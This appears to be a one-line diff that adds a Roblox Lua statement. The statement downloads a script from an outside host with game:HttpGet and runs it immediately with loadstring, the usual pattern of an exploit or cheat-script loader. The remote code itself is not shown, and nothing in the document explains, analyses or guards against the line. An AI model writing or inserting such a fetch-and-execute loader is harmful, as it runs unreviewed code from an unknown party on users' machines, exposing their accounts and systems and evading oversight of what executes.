@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vedrox.hold4564.de/new/merge/loader.lua"))()
